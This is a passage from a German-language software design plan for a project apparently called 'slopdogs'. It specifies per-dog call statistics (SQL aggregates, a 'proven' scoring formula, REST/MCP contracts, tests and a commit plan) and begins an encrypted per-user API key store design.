    deleteDogCalls(dogKey: string): Promise<void>;
    replaceReferences(fromKind: 'kennel' | 'dog', fromKey: string, rows: DogReferenceRow[]): Promise<void>;  // delete where from + insert, eine Transaktion
    removeReferences(fromKind: 'kennel' | 'dog', fromKey: string): Promise<void>;
    readAllReferences(): Promise<DogReferenceRow[]>;             // fuer das Memo (klein)
    rebuildReferences(rows: DogReferenceRow[]): Promise<void>;   // DELETE ALL + insert, eine Transaktion (Boot)
}
// PrismaStore implements IStore, IKennelStatsStore, IDogStatsStore
```

SQL (`Prisma.sql`, `Prisma.join`; SQLite und Postgres):

```sql
-- Increment (je Delta, alle in $transaction)
INSERT INTO "DogCallDaily" ("dogKey","kennelLineageId","day","source","count","ok","cached","errors","timeouts","oom","cacheHits","cacheMisses","durationMsSum","durationMsMax")
VALUES (…14 Platzhalter…)
ON CONFLICT ("dogKey","kennelLineageId","day","source") DO UPDATE SET
  "count" = "DogCallDaily"."count" + excluded."count", "ok" = "DogCallDaily"."ok" + excluded."ok",
  "cached" = "DogCallDaily"."cached" + excluded."cached", "errors" = "DogCallDaily"."errors" + excluded."errors",
  "timeouts" = "DogCallDaily"."timeouts" + excluded."timeouts", "oom" = "DogCallDaily"."oom" + excluded."oom",
  "cacheHits" = "DogCallDaily"."cacheHits" + excluded."cacheHits", "cacheMisses" = "DogCallDaily"."cacheMisses" + excluded."cacheMisses",
  "durationMsSum" = "DogCallDaily"."durationMsSum" + excluded."durationMsSum",
  "durationMsMax" = MAX("DogCallDaily"."durationMsMax", excluded."durationMsMax")
  -- SQLite: skalares MAX(a,b); Postgres: GREATEST(a,b) — die EINZIGE Dialektstelle, per `isPostgres ? 'GREATEST' : 'MAX'` in PrismaStore (Provider aus der URL, dbEnv-Logik)

-- Aggregat je Dog (alle oder Liste)
SELECT "dogKey",
  CAST(SUM("count") AS INTEGER) AS "total",
  CAST(SUM(CASE WHEN "day" >= ${since} THEN "count" ELSE 0 END) AS INTEGER) AS "last30d",
  CAST(SUM(CASE WHEN "day" >= ${since} AND "source" IN (${Prisma.join(RANKED_CALL_SOURCES)}) THEN "count" ELSE 0 END) AS INTEGER) AS "ranked30d",
  CAST(SUM(CASE WHEN "day" >= ${since} THEN "errors" + "timeouts" + "oom" ELSE 0 END) AS INTEGER) AS "failures30d",
  CAST(SUM(CASE WHEN "day" >= ${since} THEN "cached" ELSE 0 END) AS INTEGER) AS "cached30d",
  CAST(SUM(CASE WHEN "day" >= ${since} THEN "durationMsSum" ELSE 0 END) AS INTEGER) AS "durationMsSum30d",
  CAST(SUM(CASE WHEN "day" >= ${since} THEN "count" ELSE 0 END) AS INTEGER) AS "count30d",
  CAST(MAX(CASE WHEN "day" >= ${since} THEN "durationMsMax" ELSE 0 END) AS INTEGER) AS "durationMsMax30d",
  CAST(COUNT(DISTINCT CASE WHEN "day" >= ${since} THEN "kennelLineageId" END) AS INTEGER) AS "kennelsRun30d"
FROM "DogCallDaily" [WHERE "dogKey" IN (${Prisma.join(dogKeys)})] GROUP BY "dogKey"

-- Nutzung je Kennel fuer einen Dog
SELECT "kennelLineageId", CAST(SUM("count") AS INTEGER) AS "count30d", CAST(SUM("errors"+"timeouts"+"oom") AS INTEGER) AS "failures30d"
FROM "DogCallDaily" WHERE "dogKey" = ${dogKey} AND "day" >= ${since} GROUP BY "kennelLineageId"
```

Referenzen ueber den Prisma-Client (kein Raw): `replaceReferences` = `deleteMany({where:{fromKind, fromKey}})` + `createMany({data: rows})` in `$transaction`; `readAllReferences` = `findMany()`; `rebuildReferences` = `deleteMany({})` + `createMany` in `$transaction`; `deleteDogCalls` = `deleteMany({ where: { dogKey } })`. `createMany` ist auf SQLite seit Prisma 5.12 verfuegbar (5.22 im Repo). `COUNT(DISTINCT CASE … END)` zaehlt NULL nicht — beide Dialekte.

#### 4b.5 Counter, Observer-Einbau, Referenzindex, Service

**KennelCallCounter** (P4 4.3) bekommt `recordDog(input: { dogKey; kennelLineageId; source; outcome; cached; cacheHits; cacheMisses; durationMs })`, eine zweite Map `pendingDogs` mit Schluessel `${dogKey}\0${kennelLineageId}\0${day}\0${source}`, denselben Deckel (gemeinsame Zaehlung gegen `KENNEL_CALL_MAX_PENDING`), denselben Flush (ein `$transaction` mit Kennel- **und** Dog-Statements), `pendingDogAggregates(sinceDay)`, `forgetDog(dogKey)`, `forgetKennel(lineageId)` (entfernt auch Dog-Deltas dieses Kennels); `status()` += `pendingDogs`. `stop()`/Shutdown unveraendert.

**runKennel** (bereits um `attribution` erweitert, P4 4.5): vor `kennelRun.run()`:

```ts
kennelRun.setDogRunObserver({
    onDogRun: (r) => {
        const dogKey = dogStatsKeyOf(r.dog);          // lineageId | 'base:'+name | null
        if (!dogKey) return;
        this.deps.callCounter.recordDog({ dogKey, kennelLineageId: lineageId, source, outcome: r.outcome,
            cached: r.outcome === 'ok' && r.cacheHits > 0 && r.cacheMisses === 0,
            cacheHits: r.cacheHits, cacheMisses: r.cacheMisses, durationMs: r.durationMs });
    },
});
```

**DogReferenceIndex** (`services/DogReferenceIndex.ts`, neu): `replaceKennelRefs(lineageId, ownerId, dogIds)`, `replaceDogRefs(lineageId, ownerId, required, optional)`, `removeFrom(kind, key)`, `rebuild()`, `normalizeToKey(raw)`. Warum am Controller und nicht in `PrismaStore.save` (:50-123): der Store-Save ist ein generischer Upsert mit Aufrufern Seeds, heal, cascadeVisibility (:327-338), rename (`AbstractController.ts:218-223`) — dort waere die Ableitung blind. Einbau:

- `KennelController.create` (:115-135) / `save` (:242-262, nur bei neuer Version) / `heal` (:389-407) -> nach dem Store-Save `refIndex.replaceKennelRefs(lineageId, ownerId, dogIds)`.
- `KennelController.delete` (:419-443) -> `refIndex.removeFrom('kennel', lineageId)` (zusaetzlich zu `deleteKennelStats` aus P4).
- `Controller.create` (`api/Controller.ts:56-68`) / `save` (:188-200, nur bei neuer Version) -> `refIndex.replaceDogRefs(lineageId, ownerId, parentsRequired, parentsOptional)`.
- Nodes-Delete (`AbstractController.delete` :232-242 loescht **eine** Version; build_kennel-Rollback :866-884 alle einzeln): wenn danach `findAllVersions` der Lineage leer ist -> `removeFrom('dog', lineageId)`, `deleteDogCalls`, `counter.forgetDog`.
- Boot: `refIndex.rebuild()` in `main.ts` **nach** `runSeeds` (:68) und vor `createHttpApplication` (:195): `findLatestByType('KennelConfig')` + `findLatestByType('SerializedDog')` + `findLatestByType('MimicDog')` (`PrismaStore.ts:185-196`, SQL-Fenster, nur Kopfversionen), dogIds/parents parsen, `rebuildReferences(rows)` in einer Transaktion. Idempotent; jeder Start heilt Drift (Seeds schreiben am Controller vorbei, `seed-helpers.ts:12-31`).
- Verdrahtung: `createHttpApplication.ts:181-182` baut die Controller — dort den Index per Konstruktor-Option injizieren.

Normalisierung `toKey`: `base:X` und blanker Base-Klassenname (in `baseDogsMap`) -> `base:X`; Version-GUID -> per `store.load(id)` auf die lineageId (PK-Lookup, beim Boot gebuendelt); unbekannt -> Rohwert, `resolved = 0`. Versionen: nur Kopfversionen referenzieren (`listLatest`-Semantik), sonst zaehlt jede Umbenennung doppelt.

**Kennzahlen je Dog** (aus `DogReference`, in JS, Memo 30 s): `kennels.direct` (distinct Kennel-Lineages mit crew-Referenz); `kennels.transitive` (direct ∪ Kennels, die einen Dog enthalten, der rekursiv ueber parents diesen Dog braucht — BFS ueber die geladene Referenzmenge; bei 261 Kennels einige tausend Zeilen, gefolgert); `kennels.foreign` (Anteil von transitive mit `fromOwnerId` ≠ Dog-`ownerId`, null = eigener Eigentuemer `community`); `owners` (distinct fromOwnerId ueber transitive); `dogs.dependents` (distinct Dog-Lineages, deren parents diesen Dog referenzieren); `dependencies` (eigene parents, nur fuer get_node). Private Kennels zaehlen in den Zahlen; die Listen (`usage.kennels[]`) werden mit `filterReadable(…, ctx)` gefiltert, der Rest steht als `hiddenKennels`.

**DogStatsService** (`services/DogStatsService.ts`, neu; nutzt `KennelStatsService` fuer `s`): `attach(nodes[], ctx)` -> `stats`, `usageOf(dogKey, ctx)`, Memo 30 s ueber `readDogCallAggregates(since)` + `readAllReferences()` + pending-Deltas; Formel 4b.6; `invalidate()` nach Flush/Save/Delete.

#### 4b.6 "Bewaehrt" — Formel

Groessen (30 Tage UTC): `r` = ranked30d (source in `RANKED_CALL_SOURCES`); `n` = count30d (alle Quellen); `f` = failures30d = errors + timeouts + oom (alle Quellen — ein Timeout im Editor ist ein Timeout); `k` = kennels.transitive; `kf` = kennels.foreign; `s` = mittlerer Bayes-Score der Kennels aus `kennels.direct`, die mindestens eine Bewertung haben (P4 4.4), `null` wenn keiner bewertet ist.

```
usage       = log10(1 + r)                                   // 0 ohne Nutzung, 1 bei 9, 2 bei 99, 3 bei 999
reliability = n >= 5 ? 1 - f / n : 0.7                       // unter 5 Laeufen unbewiesen: neutraler Abschlag statt Fantasie-100 %
reuse       = 1 + kf + 0.25 * max(0, k - kf - 1)             // fremde Kennels voll, eigene ab dem zweiten mit einem Viertel
stars       = s === null ? 1 : 1 + s / 5                     // 1..2
proven      = usage * reliability * reuse * stars
badge       = n >= 5 && r >= 1 && k >= 1 && reliability >= 0.8
```

Rechenbeispiel (gerechnet, keine echten Daten):

- Dog A "GeocodeLookup": r 99, n 120, f 6, k 4, kf 3, s 4,27 -> usage 2,0; reliability 0,95; reuse 4,0; stars 1,854 -> proven **14,09**, badge ja.
- Dog B "MyRenderer": r 999, n 1 000, f 0, k 1, kf 0, s null -> 3,0 · 1,0 · 1,0 · 1 = **3,00**, badge ja — viel Nutzung, nur der eigene Kennel, hinter A.
- Dog C frisch: r 2, n 3, f 1, k 1, kf 0 -> 0,477 · 0,7 · 1 · 1 = **0,33**, `unproven`.
- `base:QueryRetriever`: r 5 000, n 6 000, f 0, k 180, kf 150, s 3,9 -> usage 3,7; reuse 158,25; stars 1,78 -> **1 042** — Infrastruktur dominiert erwartungsgemaess; deshalb sortiert die Palette Base-Dogs und SerializedDogs getrennt (sie trennt sie ohnehin, `waves-dog-palette.component.ts:39-43`), und die Landing zeigt nur SerializedDogs/Mimics.

#### 4b.7 REST- und MCP-Vertraege

`stats` je Node (`GET /api/nodes` Eintraege, `GET /api/nodes/:id`, MCP `list_nodes`/`get_node`; Base-Dogs eingeschlossen; nie fehlend):

```json
"stats": {
  "calls":  { "total": 640, "last30d": 120, "ranked30d": 99, "failures30d": 6, "cached30d": 41,
              "avgDurationMs": 812, "maxDurationMs": 4210, "kennelsRun30d": 4 },
  "reuse":  { "kennelsDirect": 3, "kennelsTransitive": 4, "kennelsForeign": 3, "owners": 3, "dependents": 2 },
  "proven": { "score": 14.09, "badge": true, "reliability": 0.95 }
}
```

`avgDurationMs = round(durationMsSum30d / count30d)`, `null` bei count30d 0.

`GET /api/nodes/:id/usage` (neu, `NodesRouteHandler`; `:id` = lineageId, Version-GUID oder `base:X`; 404 wenn Dog nicht lesbar):

```json
{ "ok": true, "dogKey": "3f2c…",
  "kennels": [ { "lineageId": "weather-kennel", "name": "Wetter", "visibility": "public", "ownerId": "u1", "via": "crew",
                 "count30d": 80, "failures30d": 2, "url": "/k/weather-kennel" } ],
  "hiddenKennels": 1,
  "dependents": [ { "lineageId": "…", "displayName": "WeatherCard", "kind": "required" } ],
  "dependencies": { "required": ["base:QueryRetriever"], "optional": [] },
  "byOwner": [ { "ownerId": "u2", "kennels": 2 }, { "ownerId": null, "kennels": 1 } ] }
```

`kennels[]` nur canRead-lesbare; `via` = `crew` | `transitive`; `url` = `publicKennelPath(lineageId)` (P3-Konstante, hier ohne defaultQuery — es ist ein Verweis, kein Teilen-Link).

`GET /api/nodes?sort=proven&dir=desc&limit=20` — `ListQuery` (P4 4.6) bekommt SortFields `proven` (`stats.proven.score`), `calls30d` (`stats.calls.ranked30d`), `reuse` (`stats.reuse.kennelsTransitive`) und Filter `proven=1` (nur badge); `sortValue` liest, was da ist (fehlend -> 0). Dieselbe Klasse fuer Kennels und Nodes.

MCP `list_nodes` — Schema-Erweiterung (`mcp/tools/nodes.ts:41-54`):

```json
"sort":       { "type": "string", "enum": ["name", "updatedAt", "proven", "calls30d", "reuse"],
                "description": "proven = battle-tested first (usage x reliability x reuse x kennel stars). Prefer proven dogs over building new ones." },
"dir":        { "type": "string", "enum": ["asc", "desc"] },
"provenOnly": { "type": "boolean", "description": "only dogs carrying the proven badge (>=5 runs in 30 days, >=1 public run, >=1 kennel, reliability >= 0.8)" }
```

Ausgabe: bestehendes Envelope `{nodes, total, offset, limit, hasMore}` (:144-150), jeder Node + `stats`. `get_node` (:154-177) + `stats` + `usage`. Beschreibungstext: "Prefer proven dogs: sort:'proven' lists battle-tested dogs first — reuse them instead of rebuilding." `mcp/skill.md`: "Bewaehrte Dogs zuerst" in der Doktrin. `mcp/werkzeugkasten.ts` (`buildWerkzeugkasten`): Base-Dogs nach `reuse` absteigend (optional). `health_check` += `dogStats: { pendingDogs, referenceRows }`.

`GET /api/landing` (P4 4.7) += `"provenDogs": [ { "id", "lineageId", "displayName", "description", "icon", "stats" } ]` — Top-N nach `proven.score`, nur `badge`, nur SerializedDog/MimicDog mit effektiver Sichtbarkeit public (ANON-ctx wie die Kennel-Listen). P5 rendert daraus "was gibt es schon" auf Dog-Ebene (Optik: Vorlage).

#### 4b.8 UI-Verhalten (Optik: neue Vorlage, folgt)

- `ui-app/src/app/models/dog.model.ts`: `stats?: IDogStats` an `BaseDogInfo` und `SerializedDogInfo`; `IDogUsage`. `services/dog.service.ts`: `getUsage(id)`.
- `dog-proven-badge` (neue Standalone-Komponente, eigene styles): Inputs `stats`, `compact`; zeigt Abzeichen bei `badge`, "in n Kennels", 30-Tage-Laeufe; `stats` undefined -> nichts. Reine Anzeige, keine Zustaende.
- Palette (`waves-dog-palette.component.ts:34-47`): Default-Reihenfolge je Gruppe `proven.score desc`, dann Name; Umschalter "Bewaehrt | Name" (Signal `sortMode`, localStorage `slopdogs.palette.sort.v1`); Suche (211a805) unveraendert, Treffer folgen der Reihenfolge; Badge je Eintrag.
- Dog-Seitenpanel (`components/dog-side-panel/*`): Abschnitt "Verwendung" laedt `getUsage` beim Oeffnen; Zustaende `loading`, `empty` ("noch in keinem anderen Kennel"), `list` (Kennel-Links auf `url`, `hiddenKennels` als "+n privat"), `error` mit Wiederholen.
- Kennel-Liste: nichts.

#### 4b.9 Randfaelle

| Fall | Verhalten |
|---|---|
| Dog geloescht (letzte Version) | `deleteDogCalls`, `removeFrom('dog', …)`, `forgetDog`; Referenzen **auf** ihn bleiben (dangling, `resolved` bleibt wie geschrieben); `get_node` 404 |
| Dog-Version gepinnt in dogIds | Lauf zaehlt auf die lineageId; Referenz normalisiert auf die lineageId, `resolved 1` |
| Mimic (persistiert, adoptiert) | lineageId vorhanden -> zaehlt wie SerializedDog; `imitates` (Pact-Name, `MimicDog.ts:18-21`) wird nicht indexiert |
| Frischer Auto-Mimic | keine lineageId -> nicht gezaehlt; wirft ohnehin (`KennelRun.ts:444`) -> `leadFailed` am Kennel |
| Base-Dog | `base:Klasse`; blanke Klassennamen in parents normalisiert |
| Pflicht-Base-Dog, den autoMimic zur Laufzeit ergaenzt (`KennelRun.ts:393-401`) | zaehlt unter `base:X` mit dem Kennel; keine crew-Referenz bis zum naechsten Save (`kennels.ts:560-566`) |
| Snapshot-/Build-/Swagger-Lauf | zaehlt mit `mcp-snapshot`/`mcp-build`/`swagger` — in `total`, nicht in `ranked30d`; Fehler zaehlen in `failures30d` |
| NEG-HIT | Wrapper zaehlt Hit, `letOut` zaehlt `error`; Klasse `error`, cacheHits 1 |
| Dog ohne Cache-Handler | hits/misses 0, Klasse `ok` |
| Derselbe Dog zweimal im Kennel (Version + Lineage) | Factory dedupliziert nach lineageId (`KennelRunHandler.ts:328-340`) -> ein Lauf, eine Zeile |
| Kennel geloescht | `forgetKennel`, `removeFrom('kennel', …)`; `DogCallDaily`-Zeilen mit dieser kennelLineageId **bleiben** (Dog-Historie ueberlebt den Kennel; `kennelsRun30d` zaehlt sie bis zum Fenster-Ende — akzeptiert) |
| Kennel privat | zaehlt in transitive/foreign; nicht in `usage.kennels[]` fuer Fremde |
| Zwei Instanzen beim Deploy | ON CONFLICT addiert; `durationMsMax` per MAX/GREATEST; Rebuild beider Boots idempotent (der spaetere gewinnt, Inhalt identisch) |
| Seeds | am Controller vorbei -> Boot-Rebuild erfasst sie; ownerId null -> community |
| Super-User ohne user.id | zaehlt normal; Usage-Listen ungefiltert |
| Observer wirft | try/catch im `finally` von `letOut`; Welle laeuft weiter; Fehler einmal je Prozess geloggt |
| Timeout-/OOM-Erkennung | nur ueber die Marker-Konstanten (`DOG_TIMEOUT_MARKER`, `DOG_OOM_MARKER`), damit `classifyDogError` nicht an Prosa haengt |

#### 4b.10 Testfaelle (Given/When/Then)

1. **Observer feuert je Hund genau einmal** — Given Kennel aus 1 Base-Dog + 2 SerializedDogs (einer wirft); When `runSeason` mit Test-Observer; Then 3 Reports, Outcomes ok/ok/error, `durationMs >= 0`, `waveIndex` steigt.
2. **Klassifikation** — Given SerializedDog `while(true){}` mit vmTimeoutMs 200; Then `timeout`; Given Meldung mit `DOG_OOM_MARKER`; Then `oom`; sonst `error`.
3. **Cache-Wrapper** — Given Fake-`ICacheHandler` (erster `getOrFetch` ruft factory, zweiter nicht); When Dog in zwei Seasons; Then Report 1 misses 1/hits 0 Klasse ok, Report 2 hits 1/misses 0 Klasse `cached`; Given NEG-HIT; Then hits 1 + outcome error.
4. **dogStatsKeyOf** — SerializedDog mit lineageId -> lineageId; Base-Dog -> `base:Name`; Platzhalter-Mimic -> null.
5. **recordDog + Flush** — Given 3 Reports (ok 812 ms, cached 5 ms, timeout 10 000 ms) fuer D in K, public; When flush; Then count 3, ok 1, cached 1, timeouts 1, durationMsSum 10 817, durationMsMax 10 000; zweiter Flush mit max 20 000 -> durationMsMax 20 000.
6. **Aggregat** — Given Zeilen fuer D in K1 (public 99), K2 (api-run 21), eine Zeile vor 31 Tagen (500); Then total 620, last30d 120, ranked30d 99, kennelsRun30d 2.
7. **Referenz-Ableitung** — Given Kennel-Create mit dogIds `[L1, 'base:QueryRetriever', V2]` (V2 = Version-GUID von L2); Then crew L1 pos 0, crew base:QueryRetriever pos 1, crew L2 pos 2 resolved 1. Given Dog-Save mit `parentsRequired ['QueryRetriever', L3]`, `parentsOptional ['unbekannt-guid']`; Then required base:QueryRetriever, required L3, optional 'unbekannt-guid' resolved 0. Given zweiter Save mit anderen parents; Then alte Zeilen weg.
8. **Rebuild idempotent** — Given Seeds gelaufen; When rebuild zweimal; Then identische Zeilenmenge = Σ Kopf-dogIds + Σ Kopf-parents; When ein Kennel per Controller geaendert und rebuild; Then Menge entspricht dem Kopfstand.
9. **Kennzahlen/Crew-Effekt** — Given Dog D (owner u1) in K1 (u1), K2 (u2), K3 (null) direkt und K4 (u3) transitiv ueber Dog E (parents required D); Then kennelsDirect 3, kennelsTransitive 4, kennelsForeign 3, owners 4, dependents 1; usage anonym mit K2 privat -> kennels 3 + hiddenKennels 1.
10. **Formel** — die vier Beispiele aus 4b.6 (14,09 / 3,00 / 0,33 / 1 042) auf zwei Nachkommastellen; badge nur bei A, B, Base.
11. **ListQuery/list_nodes** — Given drei Nodes mit stats; When `sort=proven desc`; Then Reihenfolge nach score; `provenOnly` filtert; `search` kombiniert; ohne stats -> 0, hinten.
12. **Delete raeumt** — Given D mit Zeilen + Referenzen von D; When letzte Version geloescht; Then `DogCallDaily` fuer D leer, Referenzen from=D weg, Referenzen to=D bleiben.
13. **Integration (lokal)** — When `execute_kennel {id: KENNEL_ID}` dann `list_nodes {sort:'calls30d', dir:'desc', limit:5}`; Then jeder Node traegt `stats`, ein Dog des Kennels hat `calls.last30d >= 1` sofort; `get_node` traegt `usage.kennels` mit KENNEL_ID; `GET /api/landing` traegt `provenDogs` (Array, ggf. leer).
14. **Kosten (Messpunkt)** — Given 20-Dog-Kennel; When 1 Lauf; Then `counter.status().pendingDogs <= 20`, keine Prisma-Query zwischen Wellen (verbose-Log), Welle-Dauer ohne/mit Observer im Rauschen (< 1 ms je Dog). When 100 Laeufe ohne Flush; Then `heapUsed`-Differenz und `pendingDogs` protokolliert — **das ist die Messung, die Amars ~200-Byte/~800-KB-Rechnung ersetzt**; Ergebnis kommt in `docs/slopdogs/PLAN.md` 4b.2 als gemessener Wert.

#### 4b.11 Abnahmekriterien (messbar)

- `npm test` gruen (Core-Build wegen Observer: `npm run build:core` zaehlt zum typecheck:core); StartupTest 1-12, 14 gruen; Integration 13 gruen lokal.
- Kein neuer PrismaClient; kein `findByType(`-Scan zur Laufzeit ausser den bekannten Stellen (grep-Nachweis; Rebuild nutzt `findLatestByType`).
- Public-Pfad weiterhin 0 DB-Roundtrips je Request.
- `DogReference`-Zeilen nach Boot = Σ Kopf-dogIds + Σ Kopf-parents (Test 8 zaehlt).
- Speicher-Messpunkt (Test 14) protokolliert; liegt `heapUsed`-Zuwachs je 1 000 pending-Eintraege ueber 1 MB, wird `KENNEL_CALL_MAX_PENDING` gesenkt und die Rechnung in 4b.2 korrigiert.
- `git diff --stat -- packages/core` zeigt nur: `IDogRunObserver.ts` (neu), `withDogCacheStats.ts` (neu), `harverster.ts`, `KennelRun.ts`, `SerializedDog.ts` (Konstanten), `index.ts` — nichts unter `packages/core/src/pacts` oder Schemas.

#### 4b.12 Commit-Schnitt (Fortsetzung der P4-Zaehlung 1-7)

8. `feat(core): IDogRunObserver, Laufzeit/Outcome-Klassifikation in letOut, Cache-Zaehl-Wrapper, Marker-Konstanten` — 4b.2. Tests 1-4.
9. `feat(store): DogCallDaily + DogReference in beiden Schemas, IDogStatsStore, PrismaStore (MAX/GREATEST-Weiche)` — 4b.3, 4b.4.
10. `feat(stats): KennelCallCounter.recordDog + gemeinsamer Flush, runKennel setzt den Observer, dogStatsKeyOf` — 4b.5. Tests 5, 6, 14.
11. `feat(refs): DogReferenceIndex, Ableitung in KennelController/Controller, Boot-Rebuild, Delete raeumt` — 4b.5. Tests 7, 8, 12.
12. `feat(stats): DogStatsService (Kennzahlen, Bewaehrt), stats an /api/nodes + list_nodes/get_node, /api/nodes/:id/usage, ListQuery proven/calls30d/reuse, health_check` — 4b.6, 4b.7. Tests 9-11, 13.
13. `feat(api): provenDogs in /api/landing; Werkzeugkasten nach reuse; skill.md` — 4b.7.
14. **entfaellt in P4b — wird P6 U5** (Palette-Zeilen mit `proven`, Dog-Inspector-Tabs `usage`/`stats`). In P4b bleibt UI-seitig nur `dog.model.ts` (`IDogStats`, `IDogUsage`) und `dog.service.ts` (`getUsage`). Begruendung: Palette und Seitenpanel werden in U5 auf Zeilen/Tabs umgebaut; das Verhalten (4b.8) ist der Vertrag.
15. `docs(mcp): Texte fuer P4b` — 4.0.

Amars urspruengliches "Commit 8 Public-Gate" entfaellt — es ist P1 (W4); Amars "Commits 15-17" (UI, 308-Test) sind: UI -> P6, 308-Test = P4 Commit 9. Abhaengigkeiten: 10 <- 8 + 9 + P4-2; 11 <- 9; 12 <- 10 + 11 + P4-4; 13 <- 12 + P4-7; 15 zuletzt.

#### 4b.13 Dateien

`packages/core/src/core/entities/IDogRunObserver.ts` (neu) · `packages/core/src/harverster.ts` · `packages/core/src/KennelRun.ts` · `packages/core/src/cache/withDogCacheStats.ts` (neu) · `packages/core/src/dogs/SerializedDog.ts` (Konstanten :1031, :837) · `packages/core/src/index.ts` · `store/prisma/schema.prisma`, `store/prisma/schema.postgres.prisma` · `store/IKennelStatsStore.ts` · `store/PrismaStore.ts` · `services/KennelCallCounter.ts` · `services/dogStatsKey.ts` (neu) · `services/DogReferenceIndex.ts` (neu) · `services/DogStatsService.ts` (neu) · `api/routes/KennelRunHandler.ts` · `api/KennelController.ts` · `api/Controller.ts` · `api/routes/NodesRouteHandler.ts` · `api/routes/ConfigRouteHandler.ts` · `api/routes/ListQuery.ts` · `api/routes/LandingRouteHandler.ts` · `mcp/tools/nodes.ts` · `mcp/tools/meta.ts` · `mcp/werkzeugkasten.ts` · `mcp/skill.md` · `main.ts` · `server-app/createHttpApplication.ts` · `StartupTest.ts` · `mcp/integration/mcp-gateway.integration.cjs` · `ui-app` `models/dog.model.ts`, `services/dog.service.ts`, `components/dog-proven-badge/` (neu), `pages/waves-viewer/components/waves-dog-palette.component.ts|.html`, `components/dog-side-panel/*`. Nicht anfassen: `seed-data` (Rebuild deckt sie), `packages/dogs-*` (der Wrapper sitzt am Injektionspunkt).

### P4c — Nutzergebundener Key-Store

Quelle: Nira `nira_slopdogs_keystore.md` (vollstaendig eingearbeitet). Lotus-Entscheidungen (technisch, gelten): **nur Option B** (`keys.fetch` mit Platzhalter, Klartext nie in der VM), Option A (`keys.get`) wird nicht gebaut; Key-Aufloesung nach **Runner-Identitaet**, **fail-closed** ohne echte `user.id` (Superuser mit `user:null` bekommt keine Keys); **Domain-Allowlist je Key Pflicht**; UI-Hinweis, dass ein DB-Reset die Keys loescht. L4/L5 ist nach P1 gewandert (P1 Commit 4).

**Ziel.** Ein eingeloggter Nutzer hinterlegt Schluessel (API-Keys, Tokens) unter einem Alias; ein Dog nutzt sie im Lauf ueber `keys.fetch(url, opts)` mit dem Platzhalter `{{key:<alias>}}` — die Ersetzung passiert auf dem Host, hinter der Worker-Membran. Der Klartext erscheint nie in Kennel-Konfiguration, Waves, Snapshot, `vmContext`, Log, Fehlertext oder Export.

#### 4c.1 Befund, auf dem der Entwurf steht (Nira, geprueft)

- `jsonStore` (`services/JsonStorageService.ts:31-82`, `store/prisma-json-storage/schema.prisma`) ist flach, Klartext, ohne User-Spalte; die Isolation entsteht erst im Prefix (`main.ts:82-119`): `isSuperUser` -> Prefix `''` (alles), eingeloggt -> `user:<id>:`, anonym -> `anon:` (ein geteilter Namensraum). Keys gehoeren deshalb **nicht** in `jsonStore`.
- Kontext-Kette: `mcp/auth/middleware.ts:31-83` baut `req.ctx`; `KennelRunHandler.toCapabilityCtx` :250-256 -> `{userId, isSuperUser}`; `runKennel` :124-126 -> `KennelRun.setCapabilityContext` (`KennelRun.ts:120-122, 270-279`) -> jeder SerializedDog (`SerializedDog.ts:426-428, 486-492, 874`).
- **Bridge** (`SerializedDog.ts:919-950`, Worker-Quelle :216-293, RPC :1039-1084): Capability-Objekte werden vor `postMessage` als Bridge registriert; der Worker bekommt nur die Methodennamen-Whitelist, jeder Aufruf laeuft per `rpc:call`/`rpc:result` auf den Host zurueck (Whitelist Host-seitig :1044-1051). `fetch` und `console` sind im Worker **nativ** (:267-272), nicht kontrollierbar. Daraus folgt Option B ohne neue Infrastruktur: der Host haelt die Funktion, der Worker sieht nur Argumente und Ergebnis.
- Leck-Flaechen L1-L12 (Nira 1.4) — fuer den Key-Store relevant: L1 volle Waves (`WavesConverter.ts:390,407-409`), L4/L5 Snapshot ohne per-Dog-Redaktion (P1-Fix), L6 Worker-`fetch` ohne Egress-Schutz, L7 Worker-`console` nach stdout, L8 Fehlertexte nach oben (`KennelRunHandler.ts:488-494`, `snapshots.ts:557-573`), L9 Lead-Yield roh, L10 Export traegt Dog-Config verbatim (`KennelBundleHandler.ts:102-127`), L11 jsonStore Klartext, L12 Verbose-Log druckt Context-Keys (Namen, nicht Werte; `SerializedDog.ts:957-958`). Kernaussage: alles, was in `collected` oder `vmContext` landet, ist nach aussen sichtbar — ein Key darf keines davon beruehren.

#### 4c.2 Speicherort und Verschluesselung

Speicherort: der **Auth-Client** (`store/generated/prisma-auth-client`, `AUTH_DATABASE_URL`; auf integration in dieselbe Postgres gespiegelt, `run-prisma-sync.cjs:47-53`). Dort liegen bereits userbezogene Geheimnisse (Tokens), der Client ist Host-seitig erreichbar (`createHttpApplication.ts:160`, `toolDeps.prisma`), und der VM-Code hat keinen Bridge-Zugang zu ihm. Kein fuenfter Client.

Verschluesselung: **AES-256-GCM** (authentifiziert). Master-Key aus Env `KEYSTORE_MASTER_KEY_V1` (hex, 64 Zeichen = 32 Byte; Validierung wie `mcp/auth/jwt.ts:10-30`). Rotation ueber `KEYSTORE_MASTER_KEY_V2`, …; Spalte `keyVersion` waehlt beim Entschluesseln; `scripts/rotateKeystore.cjs` verschluesselt um (Batch, Host-seitig, ohne Ausgabe des Klartexts). Gespeichert werden `ciphertext, iv, authTag, keyVersion` — nie Klartext, nie Rueckgabe des Klartexts ueber irgendeine Read-API.

Schema (woertlich, `store/prisma-auth/schema.prisma` **und** der Auth-Block in `store/prisma/schema.postgres.prisma:158-207` — dort liegen die Auth-Tabellen auf integration):

```prisma
model UserKey {
  id             String   @id @default(uuid())
  ownerId        String                      // User.id — der Besitzer des Schluessels
  alias          String                      // z. B. "openai" — im Dog referenziert
  last4          String                      // maskierte Anzeige, nie mehr
  ciphertext     String                      // AES-256-GCM, base64
  iv             String                      // base64
  authTag        String                      // base64
  keyVersion     Int      @default(1)        // welcher Master-Key
  allowedDomains String                      // CSV erlaubter Zieldomains (Egress-Allowlist) — Pflicht, mindestens eine
  kennelGrants   String?                     // optional: CSV kennelLineageIds, die diesen Key in oeffentlichen Laeufen nutzen duerfen (Entscheidung 8.8)
  quotaPerDay    Int?                        // Pflicht, sobald kennelGrants gesetzt ist
  usedToday      Int      @default(0)
  usedDayStamp   String?                     // YYYY-MM-DD Reset-Marke
  createdAt      DateTime @default(now())
  lastUsedAt     DateTime?
  @@unique([ownerId, alias])
  @@index([ownerId])
}
```

Env (in `.env.example`, `.env.integration.example`, Runbook P7 Schritt 3):

```
# KEYSTORE_MASTER_KEY_V1  — 32 Byte hex (64 Zeichen) fuer AES-256-GCM des User-Key-Stores. Erzeugen:
#                           node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
#                           Fehlt er, ist der Key-Store aus (POST /api/keys -> 503 keystore_disabled); Laeufe ohne Keys laufen normal.
